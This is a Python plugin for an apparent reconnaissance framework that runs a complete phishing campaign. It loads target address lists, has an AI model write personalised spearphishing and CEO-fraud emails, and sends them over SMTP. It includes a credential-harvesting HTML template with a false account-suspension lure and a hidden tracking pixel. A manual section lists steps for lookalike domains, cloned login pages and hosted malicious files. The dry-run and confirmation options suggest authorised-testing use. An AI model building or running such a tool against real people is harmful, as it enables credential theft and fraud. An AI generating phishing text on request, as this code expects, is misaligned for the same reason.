from autorecon.plugins import EmailScan
from autorecon.ai_service import get_ai_assistant
import os
import json
import smtplib
import asyncio
from datetime import datetime
try:
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
except ImportError:
    # Fallback for different Python versions
    from email.MIMEText import MIMEText
    from email.MIMEMultipart import MIMEMultipart
    from email.MIMEBase import MIMEBase
    from email import Encoders as encoders

class PhishingCampaign(EmailScan):
    """AI-enhanced email phishing campaign plugin for advanced social engineering attacks."""

    def __init__(self):
        super().__init__()
        self.name = "AI-Enhanced Phishing Campaign"
        self.tags = ['attack', 'email', 'phishing', 'social-engineering', 'ai']
        self.email_type = 'phishing'
        self.risk_level = 'high'
        self.requires_confirmation = True
        self.requires_target_emails = True

    def configure(self):
        self.add_option('smtp-server', help='SMTP server to use for sending emails')
        self.add_option('smtp-port', default='587', help='SMTP server port. Default: %(default)s')
        self.add_option('smtp-username', help='SMTP username for authentication')
        self.add_option('smtp-password', help='SMTP password for authentication')
        self.add_option('from-email', help='From email address')
        self.add_option('from-name', help='From name to display')
        self.add_option('subject', help='Email subject line (leave empty for AI generation)')
        self.add_option('template', help='Path to email template file (HTML or text)')
        self.add_option('target-emails', help='Path to file containing target email addresses (one per line)')
        self.add_option('target-info', help='Path to JSON file with target information for AI personalization')
        self.add_option('tracking-url', help='URL for tracking email opens/clicks')
        self.add_option('payload-url', help='URL for malicious payload/credential harvesting')
        self.add_true_option('use-tls', help='Use TLS encryption for SMTP connection')
        self.add_option('delay', default='5', help='Delay between emails in seconds. Default: %(default)s')
        self.add_true_option('dry-run', help='Perform a dry run without actually sending emails')
        # AI-specific options
        self.add_true_option('use-ai', help='Use AI to generate personalized phishing content')
        self.add_option('ai-model', default='llama3.1', help='AI model to use for content generation. Default: %(default)s')
        self.add_option('campaign-type', default='generic', help='Type of phishing campaign (generic, spearphishing, ceo-fraud, tech-support). Default: %(default)s')
        self.add_option('company-name', help='Target company name for AI personalization')
        self.add_option('sender-role', default='IT Security', help='Role of the email sender for AI generation. Default: %(default)s')
        self.add_true_option('generate-multiple', help='Generate multiple email variants using AI')
        self.add_option('variants-count', default='3', help='Number of email variants to generate. Default: %(default)s')

    def check(self):
        # Basic validation
        if not self.get_option('smtp_server'):
            self.error('SMTP server must be specified')
            return False
        if not self.get_option('from_email'):
            self.error('From email address must be specified')
            return False
        return True

    async def run(self, target, email_list=None):
        """Execute the AI-enhanced phishing campaign."""
        
        if self.get_option('dry_run'):
            self.info('DRY RUN MODE - No emails will be sent')

        # Load target emails
        target_emails = self._load_target_emails()
        if not target_emails:
            self.warn('No target emails found. Cannot execute phishing campaign.')
            return

        # Load target information for AI personalization
        target_info_data = self._load_target_info()

        # Generate AI content if enabled
        email_variants = []
        if self.get_option('use_ai'):
            self.info('Generating AI-powered phishing content...')
            ai_assistant = get_ai_assistant(model=self.get_option('ai_model'))
            email_variants = await self._generate_ai_content(ai_assistant, target_info_data)
        
        # Fallback to template or default content
        if not email_variants:
            email_content = self._load_email_template()
            if not email_content:
                email_content = self._get_default_template()
            email_variants = [{'subject': self.get_option('subject') or 'Important Security Update Required', 'body': email_content}]

        # Configure SMTP
        smtp_config = {
            'server': self.get_option('smtp_server'),
            'port': int(self.get_option('smtp_port')),
            'username': self.get_option('smtp_username'),
            'password': self.get_option('smtp_password'),
            'use_tls': self.get_option('use_tls')
        }

        self.info(f'Starting AI-enhanced phishing campaign targeting {len(target_emails)} email addresses with {len(email_variants)} variants')

        results = []
        for i, email in enumerate(target_emails):
            # Select email variant (rotate through variants)
            variant = email_variants[i % len(email_variants)]
            
            # Personalize content for this specific target
            personalized_content = await self._personalize_content(email, variant, target_info_data)
            
            result = await self._send_phishing_email(email, personalized_content, smtp_config)
            results.append(result)
            
            # Delay between emails
            if not self.get_option('dry_run'):
                await asyncio.sleep(int(self.get_option('delay')))

        # Save comprehensive results
        await self._save_campaign_results(target, results, email_variants, target_info_data)

        success_count = sum(1 for r in results if r['status'] == 'sent')
        self.info(f'AI-enhanced phishing campaign completed. {success_count}/{len(target_emails)} emails sent successfully.')

    def _load_target_emails(self):
        """Load target email addresses from file."""
        emails_file = self.get_option('target_emails')
        if not emails_file or not os.path.exists(emails_file):
            return []

        try:
            with open(emails_file, 'r') as f:
                emails = [line.strip() for line in f if line.strip() and '@' in line]
            return emails
        except Exception as e:
            self.error(f'Failed to load target emails: {e}')
            return []

    def _load_target_info(self):
        """Load target information for AI personalization."""
        info_file = self.get_option('target_info')
        if not info_file or not os.path.exists(info_file):
            return {}

        try:
            with open(info_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.warn(f'Failed to load target info: {e}')
            return {}

    async def _generate_ai_content(self, ai_assistant, target_info_data):
        """Generate AI-powered phishing content."""
        email_variants = []
        variants_count = int(self.get_option('variants_count'))
        campaign_type = self.get_option('campaign_type')
        
        for i in range(variants_count):
            self.info(f'Generating AI content variant {i+1}/{variants_count}...')
            
            # Prepare target info for AI
            ai_target_info = {
                'company': self.get_option('company_name') or target_info_data.get('company', 'the organization'),
                'role': target_info_data.get('role', 'employee'),
                'name': target_info_data.get('name', 'User'),
                'campaign_type': campaign_type,
                'sender_role': self.get_option('sender_role'),
                'variant_number': i + 1
            }
            
            # Generate AI content
            ai_content = await ai_assistant.generate_phishing_email(ai_target_info, campaign_type)
            
            if ai_content:
                email_variants.append({
                    'subject': ai_content.get('subject', f'Security Alert - Variant {i+1}'),
                    'body': ai_content.get('body', ''),
                    'variant_id': i + 1,
                    'generated_by': 'AI'
                })
            
            # Small delay between generations
            await asyncio.sleep(1)
        
        if email_variants:
            self.info(f'Successfully generated {len(email_variants)} AI-powered email variants')
        else:
            self.warn('Failed to generate AI content, falling back to templates')
        
        return email_variants

    async def _personalize_content(self, email_address, content_variant, target_info_data):
        """Personalize content for specific target."""
        subject = content_variant['subject']
        body = content_variant['body']
        
        # Extract name from email if not provided
        target_name = target_info_data.get(email_address, {}).get('name')
        if not target_name:
            target_name = email_address.split('@')[0].replace('.', ' ').title()
        
        # Simple personalization replacements
        replacements = {
            '{NAME}': target_name,
            '{EMAIL}': email_address,
            '{COMPANY}': self.get_option('company_name') or target_info_data.get('company', 'your organization'),
            '{TRACKING_URL}': self.get_option('tracking_url') or 'http://example.com/track',
            '{PAYLOAD_URL}': self.get_option('payload_url') or 'http://example.com/update'
        }
        
        for placeholder, value in replacements.items():
            subject = subject.replace(placeholder, value)
            body = body.replace(placeholder, value)
        
        return {'subject': subject, 'body': body}

    async def _save_campaign_results(self, target, results, email_variants, target_info_data):
        """Save comprehensive campaign results."""
        campaign_data = {
            'timestamp': datetime.now().isoformat(),
            'campaign_config': {
                'use_ai': self.get_option('use_ai'),
                'ai_model': self.get_option('ai_model'),
                'campaign_type': self.get_option('campaign_type'),
                'variants_count': len(email_variants),
                'target_count': len(results)
            },
            'email_variants': email_variants,
            'target_info': target_info_data,
            'results': results,
            'statistics': {
                'total_sent': sum(1 for r in results if r['status'] == 'sent'),
                'total_failed': sum(1 for r in results if r['status'] == 'failed'),
                'success_rate': sum(1 for r in results if r['status'] == 'sent') / len(results) * 100 if results else 0
            }
        }
        
        # Save main results
        results_file = os.path.join(target.scandir, 'ai_phishing_campaign_results.json')
        with open(results_file, 'w') as f:
            json.dump(campaign_data, f, indent=2)
        
        # Save email templates for review
        templates_dir = os.path.join(target.scandir, 'phishing_templates')
        os.makedirs(templates_dir, exist_ok=True)
        
        for i, variant in enumerate(email_variants):
            template_file = os.path.join(templates_dir, f'variant_{i+1}.html')
            with open(template_file, 'w') as f:
                f.write(f"Subject: {variant['subject']}\n\n")
                f.write(variant['body'])
        
        self.info(f'Campaign results saved to {results_file}')
        self.info(f'Email templates saved to {templates_dir}')

    def _load_email_template(self):
        """Load email template from file."""
        template_file = self.get_option('template')
        if not template_file or not os.path.exists(template_file):
            return None

        try:
            with open(template_file, 'r') as f:
                return f.read()
        except Exception as e:
            self.error(f'Failed to load email template: {e}')
            return None

    def _get_default_template(self):
        """Get default phishing email template."""
        tracking_url = self.get_option('tracking_url') or 'http://example.com/track'
        payload_url = self.get_option('payload_url') or 'http://example.com/update'
        
        return f'''
<html>
<body>
<h2>Important Security Update Required</h2>
<p>Dear User,</p>
<p>We have detected suspicious activity on your account. For your security, we need you to verify your credentials immediately.</p>
<p><strong>Action Required:</strong> Please click the link below to secure your account:</p>
<p><a href="{payload_url}">Click Here to Verify Your Account</a></p>
<p>This verification must be completed within 24 hours to prevent account suspension.</p>
<p>Thank you for your cooperation.</p>
<p>IT Security Team</p>
<img src="{tracking_url}" width="1" height="1" style="display:none;">
</body>
</html>
'''

    async def _send_phishing_email(self, target_email, content_dict, smtp_config):
        """Send a phishing email to a target."""
        try:
            if self.get_option('dry_run'):
                self.info(f'DRY RUN: Would send email to {target_email}')
                self.info(f'Subject: {content_dict["subject"]}')
                return {'email': target_email, 'status': 'dry_run', 'message': 'Dry run - email not sent', 'subject': content_dict["subject"]}

            # Create message
            msg = MIMEMultipart('alternative')
            msg['Subject'] = content_dict['subject']
            msg['From'] = f"{self.get_option('from_name') or 'IT Security'} <{self.get_option('from_email')}>"
            msg['To'] = target_email

            # Add content
            content = content_dict['body']
            if '<html>' in content.lower() or '<body>' in content.lower():
                msg.attach(MIMEText(content, 'html'))
            else:
                msg.attach(MIMEText(content, 'plain'))

            # Send email
            server = smtplib.SMTP(smtp_config['server'], smtp_config['port'])
            
            if smtp_config['use_tls']:
                server.starttls()
            
            if smtp_config['username'] and smtp_config['password']:
                server.login(smtp_config['username'], smtp_config['password'])
            
            server.send_message(msg)
            server.quit()

            self.info(f'Phishing email sent to {target_email} - Subject: {content_dict["subject"]}')
            return {'email': target_email, 'status': 'sent', 'message': 'Email sent successfully', 'subject': content_dict["subject"]}

        except Exception as e:
            self.error(f'Failed to send email to {target_email}: {e}')
            return {'email': target_email, 'status': 'failed', 'message': str(e), 'subject': content_dict.get("subject", "Unknown")}

    def manual(self, target, plugin_was_run):
        if not plugin_was_run:
            target.add_manual_command('Manual phishing campaign setup:', [
                '# 1. Gather target email addresses',
                'theHarvester -d example.com -l 500 -b all',
                'hunter.io domain search',
                '',
                '# 2. Set up email infrastructure',
                '# - Register domain similar to target organization',
                '# - Configure SPF, DKIM, DMARC records',
                '# - Set up SMTP server or use service like SendGrid',
                '',
                '# 3. Create convincing email templates',
                '# - Clone legitimate emails from the organization',
                '# - Use social engineering techniques',
                '# - Include tracking pixels and malicious links',
                '',
                '# 4. Set up credential harvesting or payload delivery',
                '# - Clone legitimate login pages',
                '# - Host malicious files',
                '# - Set up data collection endpoints',
                '',
                '# 5. Tools for email campaigns:',
                'gophish',
                'king-phisher',
                'social-engineer-toolkit (SET)',
                'evilginx2',
                '',
                '# 6. Monitor campaign effectiveness',
                '# - Track email opens, clicks, and credential submissions',
                '# - Analyze results and adjust tactics'
            ])